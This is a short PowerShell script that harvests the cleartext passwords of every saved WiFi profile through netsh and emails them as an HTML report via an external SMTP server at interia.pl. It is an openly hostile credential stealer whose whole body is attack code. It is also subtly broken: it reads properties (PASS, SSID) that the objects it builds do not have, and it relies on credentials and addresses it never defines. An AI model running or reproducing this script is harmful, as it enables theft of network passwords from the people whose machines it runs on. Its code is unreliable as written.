$SmtpServer = "poczta.interia.pl" ; $SmtpPort = "587"
$secpasswd = ConvertTo-SecureString $Password -AsPlainText -Force
$cred1 = New-Object System.Management.Automation.PSCredential ($username, $secpasswd)
$Subject = "WiFi"

$p = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }}

foreach ($pm in $p)
{
$Body += "<h1>WiFi Report</h1><h3>SSID: 3333<br>PASSWORD: ::</h3>" -replace "::",$pm.PASS  -replace "3333",$pm.SSID
}

Send-MailMessage -From $From -to $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -Credential $cred1 -UseSsl -BodyAsHtml